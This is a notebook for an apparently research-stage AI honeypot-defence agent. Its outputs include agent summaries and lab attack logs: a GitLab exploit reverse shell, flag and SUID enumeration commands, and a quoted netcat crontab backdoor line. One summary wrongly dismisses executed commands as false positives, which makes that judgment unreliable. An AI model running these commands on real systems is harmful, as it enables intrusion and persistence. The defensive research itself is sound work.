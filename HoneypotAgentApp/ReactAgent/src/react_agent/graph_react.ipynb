{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "72cd0aa5",
   "metadata": {},
   "outputs": [],
   "source": [
    "import nest_asyncio\n",
    "from langgraph.graph import START, StateGraph\n",
    "from IPython.display import Image, display\n",
    "from langchain_core.runnables.graph import MermaidDrawMethod\n",
    "from typing import Literal\n",
    "from langchain_core.messages import AIMessage\n",
    "import os\n",
    "from openai import OpenAI\n",
    "from dotenv import load_dotenv\n",
    "from nodes import assistant, summarize_packets, execute_tools, save_iteration_node\n",
    "from state import HoneypotStateReact\n",
    "from memory import EpisodicMemory\n",
    "nest_asyncio.apply()\n",
    "import benchmark as b\n",
    "\n",
    "\n",
    "\n",
    "def display_graph(graph, width=500, height=600):\n",
    "\n",
    "    png_bytes = graph.get_graph().draw_mermaid_png(draw_method=MermaidDrawMethod.PYPPETEER)\n",
    "\n",
    "    display(Image(data=png_bytes, format=\"png\", width=width, height=height)\n",
    ")\n",
    "\n",
    "def is_api_key_valid():\n",
    "    try:\n",
    "        client = OpenAI(api_key=os.getenv(\"OPENAI_API_KEY\"))\n",
    "        response = client.responses.create(\n",
    "            model=\"gpt-4o\",\n",
    "            instructions=\"Test API key\",\n",
    "            input=\"Test API key\",\n",
    "            max_output_tokens=16,\n",
    "            timeout=10\n",
    "            )\n",
    "    except Exception as e:\n",
    "        print(f\"Error: {e}\")\n",
    "        return False\n",
    "    else:\n",
    "        return True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "5f08c61c",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/responses \"HTTP/1.1 200 OK\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "API key is valid: True\n"
     ]
    }
   ],
   "source": [
    "\n",
    "# Load environment variables\n",
    "load_dotenv()\n",
    "os.environ[\"OPENAI_API_KEY\"] = os.getenv(\"OPENAI_API_KEY\")\n",
    "#  Check the validity of the API key\n",
    "api_key_valid = is_api_key_valid()\n",
    "print(\"API key is valid:\", api_key_valid)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ae330436",
   "metadata": {},
   "source": [
    "# Memory implementation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "fcb92eee",
   "metadata": {},
   "outputs": [],
   "source": [
    "def should_continue_from_assistant(state: HoneypotStateReact) -> Literal[\"tools\", \"save_iteration\", \"cleanup\", \"__end__\"]:\n",
    "    last_message = state.messages[-1]\n",
    "    \n",
    "    if hasattr(last_message, 'tool_calls') and last_message.tool_calls:\n",
    "        return \"tools\"\n",
    "    \n",
    "    # if state.network_flows and state.security_events and state.compressed_packets and not state.packet_summary:\n",
    "    #     return \"threat_verification\"\n",
    "    \n",
    "    if (len(state.packet_summary) > 1 and len(state.messages) > 1 and \n",
    "        not state.cleanup_flag and (not hasattr(last_message, 'tool_calls') or not last_message.tool_calls)) \\\n",
    "            and \"ITERATION SUMMARY\" in last_message.content:\n",
    "        return \"save_iteration\"\n",
    "    \n",
    "    if not state.cleanup_flag and len(state.messages) > 1 and len(state.packet_summary) > 1:\n",
    "        return \"cleanup\"\n",
    "\n",
    "    return \"__end__\"\n",
    "\n",
    "def should_continue_from_tools(state: HoneypotStateReact) -> Literal[\"threat_verification\", \"assistant\"]:\n",
    "    # After tools are executed, decide where to go next\n",
    "    if state.network_flows and state.security_events and state.compressed_packets and not state.packet_summary:\n",
    "        return \"threat_verification\"\n",
    "    return \"assistant\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5cc6ffaa",
   "metadata": {},
   "outputs": [],
   "source": [
    "def cleanup_messages(state: HoneypotStateReact):\n",
    "    \"\"\"Clean up ALL messages and data, keeping only essential state for next iteration\"\"\"\n",
    "    print(\"Performing complete cleanup before ending iteration...\")\n",
    "    \n",
    "    if state.messages:\n",
    "        print(\"Flushing all messages and resetting state for next iteration\")\n",
    "        \n",
    "        return {\n",
    "            \"messages\": state.messages[-1],  # Flush all messages\n",
    "            \"packet_summary\": {},  # Clear packet summary\n",
    "            \"network_flows\": {},  # Clear network flows\n",
    "            \"security_events\": {},  # Clear security events\n",
    "            \"compressed_packets\": {},  # Clear compressed packets\n",
    "            \"firewall_config\": \"\",  # Will be reloaded in next iteration\n",
    "            \"honeypot_config\": \"\",  # Will be reloaded in next iteration\n",
    "            \"firewall_status\": \"\",  # Will be reloaded in next iteration\n",
    "            \"monitor_status\": \"\",  # Will be reloaded in next iteration\n",
    "            \"memory_context\": [],  # Will be reloaded in next iteration\n",
    "            \"cleanup_flag\": True\n",
    "        }\n",
    "    else:\n",
    "        print(\"No messages to cleanup\")\n",
    "        return {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "e092f089",
   "metadata": {},
   "outputs": [],
   "source": [
    "def build_react_graph():\n",
    "    builder = StateGraph(HoneypotStateReact)\n",
    "    \n",
    "    # Add nodes\n",
    "    builder.add_node(\"assistant\", assistant)\n",
    "    builder.add_node(\"tools\", execute_tools)\n",
    "    builder.add_node(\"threat_verification\", summarize_packets)\n",
    "    builder.add_node(\"save_iteration\", save_iteration_node)  # NEW: Save iteration node\n",
    "    builder.add_node(\"cleanup\", cleanup_messages)  # Modified cleanup\n",
    "    \n",
    "    # Add edges\n",
    "    builder.add_edge(START, \"assistant\")\n",
    "    builder.add_conditional_edges(\"assistant\", should_continue_from_assistant)\n",
    "    builder.add_conditional_edges(\"tools\", should_continue_from_tools)\n",
    "    builder.add_edge(\"threat_verification\", \"assistant\")\n",
    "    builder.add_edge(\"save_iteration\", \"cleanup\")  # NEW: Save iteration then cleanup\n",
    "    builder.add_edge(\"cleanup\", \"__end__\")  # Cleanup then end\n",
    "        \n",
    "    return builder.compile()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "be64fd88",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:pyppeteer.launcher:Browser listening on: ws://127.0.0.1:52325/devtools/browser/a85222b6-30a9-48ce-baef-e970c58bd064\n",
      "INFO:pyppeteer.launcher:terminate chrome process...\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<IPython.core.display.Image object>"
      ]
     },
     "metadata": {
      "image/png": {
       "height": 600,
       "width": 500
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "graph = build_react_graph()\n",
    "display_graph(graph)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "b33888d6",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create an initial state\n",
    "memory = EpisodicMemory()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "f9204c6b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Loaded 5 recent iterations from episodic memory.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "WARNING:tools:CRITICAL: 4 command execution attempts detected!\n",
      "WARNING:tools:  Command from 192.168.100.2: Command execution: /bin/bash\n",
      "WARNING:tools:  Command from 192.168.100.2: Direct system command execution\n",
      "WARNING:tools:  Command from 192.168.100.2: Command execution: /bin/bash\n",
      "WARNING:tools:ALERT: 2 packets contain command execution patterns!\n",
      "WARNING:nodes:Security events: Found 4 command execution attempts from 2 threat IPs\n",
      "WARNING:nodes:Compressed packets: Found 13/500 packets with threats\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n",
      "Analyzing all threat incidents in single pass...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_6. Total iterations: 6\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** 172.20.0.2:2375, 172.20.0.2:2376 (\"unauthorized-rce-docker-1\")\n",
      "- **Exploitation Level:** 33% (EXPOSED)\n",
      "- **Evidence Summary:** Attacker 192.168.100.2 continues system and network reconnaissance—ARP and service enumeration only. No signs of exploitation, code execution, reverse shells, or privilege escalation. No malicious payloads or exploitation attempts in packet or flow logs.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:**\n",
      "  - add_allow_rule(source_ip=192.168.100.2, dest_ip=172.20.0.2, port=2375, protocol='tcp')\n",
      "  - add_allow_rule(source_ip=172.20.0.2, dest_ip=192.168.100.2, port=None, protocol='tcp')\n",
      "  - add_allow_rule(source_ip=192.168.100.2, dest_ip=172.20.0.2, port=2376, protocol='tcp')\n",
      "  - add_allow_rule(source_ip=172.20.0.2, dest_ip=192.168.100.2, port=None, protocol='tcp')\n",
      "- **Justification:** The attacker is extensively scanning and enumerating the environment but is not actively exploiting. Controlled exposure of Docker API ports (2375, 2376) is maintained on a single honeypot to encourage further attack progression. No security events or packet payloads warrant blocking or lockdown. Current exposure maximizes intelligence-gathering while controlling risk.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.2 unauthorized-rce-docker-1):** 33% - Docker API exposed - Reconnaissance, no compromise.\n",
      "- **Honeypot 2 (172.20.0.3 s2-057-struts2-1):** 0% - Not exposed, only scanned.\n",
      "- **Honeypot 3 (172.20.0.6 cve-2021-22205-gitlab-1):** 0% - Not exposed, only scanned.\n",
      "- **Honeypot 4 (172.20.0.7 gitlab-proxy):** 0% - Not exposed, only scanned.\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "Maintaining focused exposure on the Docker API honeypot is optimal given only reconnaissance is observed. Sustained engagement may eventually yield exploitation attempts, advancing attack graph coverage and intelligence collected. No evidence of command execution or escalation—no new honeypots exposed. Adhering to stepwise, evidence-based attack graph progression.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Closely monitor for exploitation attempts, command execution, or Docker API misuse on 172.20.0.2.\n",
      "- Reassess if attacker attempts web shell or privilege escalation; be ready to update exploitation level and expose a different honeypot if 172.20.0.2 reaches 100% (full compromise).\n",
      "- Continue high-fidelity analysis of security events, flows, and packets.\n",
      "\n",
      "**LOCKDOWN STATUS:** INACTIVE\n",
      "```\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** 172.20.0.2:2375, 172.20.0.2:2376 (\"unauthorized-rce-docker-1\")\n",
      "- **Exploitation Level:** 33% (EXPOSED)\n",
      "- **Evidence Summary:** The attacker (192.168.100.2) continues to probe Docker API ports and recently initiated a new connection on port 36159 targeting 172.20.0.2. Multiple detections of \"path traversal\" attempts are present, but all payload analyses (packet and threat verification) confirm these are FALSE POSITIVES: no directory traversal, exploitation, or commands (even though command-like strings such as `find / -type f -name 'user.txt' 2>/dev/null` and `cat /home/ctf/user.txt` appeared, they were not executed within a shell or interpreted context—no command executions, code injections, or session manipulations detected). The honeypot shows no evidence of compromise or privileged access.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:** \n",
      "  - [No new rules added—existing exposure on 2375/tcp and 2376/tcp maintained, as current activity does not indicate any exploitation or compromise]\n",
      "- **Justification:** All system health and packet payload analysis confirm that no verified attack or successful exploitation has occurred. \"Threat\" traffic flagged by heuristics/detectors does not actually represent malicious activity; incident analysis shows false positives. Allowing continued, tightly controlled exposure of Docker API only gives the adversary further opportunity to attempt exploitation, supporting richer attack graph development and intelligence gathering.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.2, unauthorized-rce-docker-1):** 33% - Docker API exposed - Active reconnaissance and non-exploitable probing only\n",
      "- **Honeypot 2 (172.20.0.3, s2-057-struts2-1):** 0% - Not exposed, only scanned\n",
      "- **Honeypot 3 (172.20.0.6, cve-2021-22205-gitlab-1):** 0% - Not exposed, only scanned\n",
      "- **Honeypot 4 (172.20.0.7, gitlab-proxy):** 0% - Not exposed, only scanned\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "Evidence-based review shows current threat events are all detector artefacts—payload content is either TCP framing or non-actionable input. Policy is to maintain current exposure only (2375/2376, Docker API) and not escalate privileges, rotate honeypots, nor restrict flows prematurely. This prolongs attacker engagement and evidence gathering potential for a fuller attack graph without compromising honeypot safety.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Continue high-fidelity packet and event analysis, watching for the first verified code execution, command injection, docker API misuse, or privilege escalation attempt.\n",
      "- Be ready to escalate exposure (broaden port/surface or rotate to a new honeypot) only upon verified exploitation or compromise evidence.\n",
      "- Block only if empirically proven malicious actions (e.g., actual shell access, lateral movement, or compromise attempts) are detected.\n",
      "\n",
      "**LOCKDOWN STATUS:** INACTIVE\n",
      "```\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** 172.20.0.2:2375, 172.20.0.2:2376 (\"unauthorized-rce-docker-1\")\n",
      "- **Exploitation Level:** 100% (PRIVILEGE_ESCALATION)\n",
      "- **Evidence Summary:** High-confidence, multi-source confirmation of full root compromise via Docker API. The attacker (192.168.100.2) created a container with a bind-mount to the host /etc directory, and implanted a persistent reverse shell (Netcat -> /etc/crontabs/root). Direct command execution + root-level persistence verified by packet and payload inspection (see \"Cmd\": [\"sh\", \"-c\", \"echo '* * * * * /usr/bin/nc 192.168.100.2 4444 -e /bin/sh' >> /tmp/etc/crontabs/root\"]).\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:**\n",
      "  - add_block_rule(source_ip=192.168.100.2, dest_ip=172.20.0.2, port=None, protocol='all')\n",
      "- **Justification:** This is a full, verified root compromise and persistent backdoor creation from the attacker's IP. Blocking all further traffic from this attacker to this honeypot is mandatory to prevent ongoing post-exploitation or potential lateral movement. The decision is 100% evidence-based, as privilege escalation and host persistence are confirmed in packet content and command logs. Remaining honeypots are not yet exposed for targeted attack graph progression—do NOT generalize the block to other containers yet.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.2, unauthorized-rce-docker-1):** 100% - Docker API root compromise - full system and persistence confirmed\n",
      "- **Honeypot 2 (172.20.0.3, s2-057-struts2-1):** 0% - Not exposed, only scanned\n",
      "- **Honeypot 3 (172.20.0.6, cve-2021-22205-gitlab-1):** 0% - Not exposed, only scanned\n",
      "- **Honeypot 4 (172.20.0.7, gitlab-proxy):** 0% - Not exposed, only scanned\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "The attack graph for \"unauthorized-rce-docker-1\" is fully explored (root compromise, persistence, host breakout). Attack graph progression demands focused, systematic exposure—not blanket shield or full lockdown until all honeypots are 100% exploited. The next iteration should rotate to exposing the next strategic honeypot to continue intelligence gathering while maximizing security.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Rotate exposure: Open a service (e.g., 8080/tcp) on the next honeypot (e.g., s2-057-struts2-1) to provide a new attack surface for the adversary.\n",
      "- Maintain the block on 192.168.100.2 -> 172.20.0.2 (all ports/all protocols).\n",
      "- Monitor all logs/events for attempts at lateral movement or new exploitation vectors targeting the freshly exposed honeypot.\n",
      "- Review system health and traffic patterns before and after exposure changes.\n",
      "\n",
      "**LOCKDOWN STATUS:** INACTIVE\n",
      "```\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** 172.20.0.3:8080 (\"s2-057-struts2-1\")\n",
      "- **Exploitation Level:** 33% (EXPOSED)\n",
      "- **Evidence Summary:** Attacker 192.168.100.2 performed ICMP and TCP reconnaissance probes on s2-057-struts2-1. No verified exploitation, no command executions, and no compromise detected in the payloads or packet traces. Prior activity on previously exposed unauthorized-rce-docker-1 is now blocked due to full compromise. All threat detection events are confirmed false positives—no actionable, malicious payloads or actual exploit attempts.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:** \n",
      "  - add_allow_rule(source_ip=192.168.100.2, dest_ip=172.20.0.3, port=8080, protocol='tcp')\n",
      "  - add_allow_rule(source_ip=172.20.0.3, dest_ip=192.168.100.2, port=None, protocol='tcp')\n",
      "\n",
      "- **Justification:** \n",
      "  - Based on memory and packet analysis, \"unauthorized-rce-docker-1\" has completed the attack graph (100% exploited, blocked attacker). The next honeypot (\"s2-057-struts2-1\") is strategically exposed to ICMP + 8080/tcp to guide the attacker toward application attacks (Java/Struts2 exploitation). This maximizes controlled attack surface exposure for deeper intelligence. No confirmed threats—only reconnaissance—so exposure is safe and compliant with protocol.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.2, unauthorized-rce-docker-1):** 100% - Docker API root compromise and host persistence; attack graph complete; attacker blocked.\n",
      "- **Honeypot 2 (172.20.0.3, s2-057-struts2-1):** 33% - Port 8080 exposed for application exploit testing; only scanner probes seen so far.\n",
      "- **Honeypot 3 (172.20.0.6, cve-2021-22205-gitlab-1):** 0% - Not yet exposed.\n",
      "- **Honeypot 4 (172.20.0.7, gitlab-proxy):** 0% - Not yet exposed.\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "Rotating focused exposure from the fully compromised Docker honeypot to the next logical target (Struts2/Java) is required for full attack graph progression. Intelligence gathering continues with minimal risk; packet/command/event review confirms all recent detections are benign or false positives. By allowing only the key application port on the new honeypot, we promote controlled, trackable substrate for future exploitation stages.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Watch s2-057-struts2-1 for evidence of exploitation, command execution, or lateral movement attempts.\n",
      "- Only escalate to further honeypot exposure or lockdown if confirmed exploitation activity is detected, or if attack graph milestone is reached.\n",
      "- Re-review flows, payloads, and system health for each cycle to guarantee accurate threat tracking.\n",
      "\n",
      "**LOCKDOWN STATUS:** INACTIVE\n",
      "```\n",
      "Executing Honeypot Firewall Guardian Protocol...\n",
      "\n",
      "```\n",
      "## ITERATION SUMMARY\n",
      "\n",
      "**HONEYPOT STATUS:**\n",
      "- **Currently Exposed:** 172.20.0.3:8080 (\"s2-057-struts2-1\")\n",
      "- **Exploitation Level:** 100% (PRIVILEGE_ESCALATION)\n",
      "- **Evidence Summary:** Multiple confirmed high-risk attacks from 192.168.100.2, including direct reverse shell payloads, bash command execution, and privilege escalation. Packets show successful outbound reverse shell connections (port 9999), system command execution (`/bin/bash`), and root flag exfiltration (`cat /root/root.txt`). Sequence and payloads confirm both shell access and root-level file access, demonstrating complete compromise.\n",
      "\n",
      "**FIREWALL ACTIONS:**\n",
      "- **Rules Applied:**\n",
      "  - add_block_rule(source_ip=192.168.100.2, dest_ip=172.20.0.3, port=None, protocol='all')\n",
      "- **Justification:** Forensic packet analysis and event logs unambiguously show root-level compromise, live reverse shell (network flow, command, and payload), and attacker-controlled code execution on s2-057-struts2-1. Per protocol, attacker must be immediately blocked from further access to prevent ongoing post-exploitation or lateral movement. The evidence includes active privilege escalation attempts and system command results from a root shell, which demands shutdown of current attacker access to this honeypot.\n",
      "\n",
      "**ATTACK GRAPH PROGRESSION:**\n",
      "- **Honeypot 1 (172.20.0.2, unauthorized-rce-docker-1):** 100% - Docker API root compromise; attacker blocked.\n",
      "- **Honeypot 2 (172.20.0.3, s2-057-struts2-1):** 100% - Application exploit, root shell, privilege escalation, flag exfiltration; attacker blocked.\n",
      "- **Honeypot 3 (172.20.0.6, cve-2021-22205-gitlab-1):** 0% - Not yet exposed; only scanned.\n",
      "- **Honeypot 4 (172.20.0.7, gitlab-proxy):** 0% - Not yet exposed; only scanned.\n",
      "\n",
      "**DECISION RATIONALE:**\n",
      "Protocol requires blocking all further attacker access upon verified 100% exploitation of a honeypot. For s2-057-struts2-1, complete attack graph coverage is confirmed: full compromise, reverse shell establishment, and root-only file exfiltration. This secures honeypot integrity for the remainder of the session. Remaining honeypots are untouched; next cycle, exposure must pivot to the next unexploited (e.g., cve-2021-22205-gitlab-1), strictly one at a time, to continue attack graph progression and maximize intelligence gathering without risk sprawl.\n",
      "\n",
      "**NEXT ITERATION GUIDANCE:**\n",
      "- Strategically expose a key port (e.g., 8080/tcp or 443/tcp) on cve-2021-22205-gitlab-1 for the attacker, following attack graph exploration order.\n",
      "- Carefully monitor the newly exposed honeypot for command execution, reverse shell attempts, and privilege escalation.\n",
      "- Maintain current blocks on previously 100%-compromised honeypots.\n",
      "- Review for any lateral movements or persistence attempts post-block.\n",
      "\n",
      "**LOCKDOWN STATUS:** INACTIVE\n",
      "```\n"
     ]
    }
   ],
   "source": [
    "initial_state = HoneypotStateReact(\n",
    "    messages=\"Analyze a time_window=2 for all the tools and actually use the tool for adding firewall rules\"\n",
    ")\n",
    "response = graph.invoke(initial_state, config={\"configurable\": {\"store\" : memory}})\n",
    "for m in response['messages']:\n",
    "    m.pretty_print()\n",
    "for i in memory.get_recent_iterations():\n",
    "    print(i.value[\"last_message\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "da2c1795",
   "metadata": {},
   "source": [
    "# Benchmark"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "ce3b2717",
   "metadata": {},
   "outputs": [],
   "source": [
    "config_dict = {\n",
    "            \"max_epochs\": 10,\n",
    "            \"attack_duration\": 300,\n",
    "            \"monitor_accumulation_wait\": 3,\n",
    "            \"firewall_update_wait\": 1,\n",
    "            \"between_epoch_wait\": 3,\n",
    "            \"stop_on_lockdown\": True,\n",
    "        }"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "e045477f",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Starting benchmark run\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.AttackerController:Found existing attacker container: attacker\n",
      "INFO:benchmark.AttackerController:Successfully connected to attacker container\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 1 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-1] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:Attack script completed before timeout.\n",
      "INFO:benchmark.Orchestrator:=== Phase: MONITORING_ACCUMULATION ===\n",
      "INFO:benchmark.Orchestrator:Accumulating monitoring data for 3s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-1] \n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-1] Service    Target    Port    Path    Version\n",
      "---------  --------  ------  ------  ---------\n",
      "\n",
      "[ATTACK-1] \n",
      "=== 🏁 Flags Summary ===\n",
      "[*] Exploit executed successfully\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: AGENT_ANALYSIS ===\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Executing agent for epoch 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "WARNING:nodes:Compressed packets: Found 16/500 packets with threats\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Analyzing packets and verifying detected threats...\n",
      "Analyzing all threat incidents in single pass...\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:httpx:HTTP Request: POST https://api.openai.com/v1/chat/completions \"HTTP/1.1 200 OK\"\n",
      "INFO:benchmark.Orchestrator:=== Phase: FIREWALL_UPDATE_WAIT ===\n",
      "INFO:benchmark.Orchestrator:Waiting 1s for firewall updates...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Memory: Iteration saved with ID iteration_1. Total iterations: 1\n",
      "Performing complete cleanup before ending iteration...\n",
      "Flushing all messages and resetting state for next iteration\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "INFO:benchmark.Orchestrator:=== Phase: METRICS_COLLECTION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: EPOCH_COMPLETE ===\n",
      "INFO:benchmark.Orchestrator:Saved epoch results to benchmark_results/20250627_122023/epoch_001.json\n",
      "INFO:benchmark.Orchestrator:Waiting 3s before next epoch...\n",
      "INFO:benchmark.Orchestrator:\n",
      "============================================================\n",
      "INFO:benchmark.Orchestrator:EPOCH 2 STARTING\n",
      "INFO:benchmark.Orchestrator:============================================================\n",
      "\n",
      "INFO:benchmark.Orchestrator:=== Phase: INITIALIZATION ===\n",
      "INFO:benchmark.Orchestrator:=== Phase: ATTACK_EXECUTION ===\n",
      "INFO:benchmark.Orchestrator:Starting attacker script with a fallback timeout of 300s...\n",
      "INFO:benchmark.Orchestrator:Attack script running with a fallback timeout of 300s...\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ATTACK-2] [*] Attacker IP address: 192.168.100.2\n",
      "[*] Launching exploit manager...\n",
      "[*] Scanning 172.20.0.0/27 for open ports...\n",
      "[ATTACK-2] [+] Host 172.20.0.5 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-2] [*] Checking port 80 for Struts...\n",
      "[ATTACK-2] [+] Host 172.20.0.6 has open ports: [('80', 'http')]\n",
      "[*] Checking port 80 for GitLab...\n",
      "[ATTACK-2] [*] Checking port 80 for Struts...\n",
      "[ATTACK-2] Checking if version is vulnerable: 13.12.3\n",
      "\n",
      "[+] Detected vulnerable services:\n",
      "\n",
      "[ATTACK-2] Service    Target        Port  Path                  Version\n",
      "---------  ----------  ------  --------------------  ---------\n",
      "GITLAB     172.20.0.6      80  http://172.20.0.6:80  13.12.3\n",
      "\n",
      "[ATTACK-2] [>>>] Launching GitLab exploit against http://172.20.0.6:80 (version: 13.12.3)[ATTACK-2] \n",
      "[ATTACK-2] GITLAB >> ['/attacker/scripts/gitlab/gitlab_exploit.py', 'http://172.20.0.6:80', '192.168.100.2']\n",
      "GITLAB >> [*] Starting scan and exploit chain...\n",
      "[ATTACK-2] GITLAB >> [*] Starting network listener script\n",
      "[ATTACK-2] GITLAB >> [*] Waiting 5 seconds before triggering the connection...\n",
      "GITLAB >> [*] Setting up listener on 0.0.0.0:9001\n",
      "[ATTACK-2] GITLAB >> [*] Listening on port 9001...\n",
      "[ATTACK-2] GITLAB >> [*] Triggering connection to the listener...\n",
      "[ATTACK-2] GITLAB >> [*] Got connection from ('172.20.0.5', 58218)\n",
      "GITLAB >> [*] Sending commands to the shell:\n",
      "GITLAB >> [>] Executing: find / -type f -name 'user.txt' 2>/dev/null\n",
      "[ATTACK-2] GITLAB >> [<] Response:\n",
      "GITLAB >> bash: cannot set terminal process group (1018): Inappropriate ioctl for device\n",
      "GITLAB >> bash: no job control in this shell\n",
      "GITLAB >> bash-4.4$ find / -type f -name 'user.txt' 2>/dev/null\n",
      "GITLAB >> /home/ctf/user.txt\n",
      "GITLAB >> bash-4.4$\n",
      "GITLAB >> [>] Executing: cat /home/ctf/user.txt\n",
      "[ATTACK-2] GITLAB >> [<] Response:\n",
      "GITLAB >> cat /home/ctf/user.txt\n",
      "GITLAB >> flag{user_access}\n",
      "GITLAB >> bash-4.4$\n",
      "GITLAB >> [>] Executing: find / -perm -4000 -type f 2>/dev/null\n",
      "[ATTACK-2] GITLAB >> [<] Response:\n",
      "GITLAB >> find / -perm -4000 -type f 2>/dev/null\n",
      "GITLAB >> /bin/bash\n",
      "[ATTACK-2] GITLAB >> /bin/umount\n",
      "GITLAB >> /bin/mount\n",
      "[ATTACK-2] GITLAB >> /bin/su\n",
      "GITLAB >> /usr/bin/newgrp\n",
      "GITLAB >> /usr/bin/chfn\n",
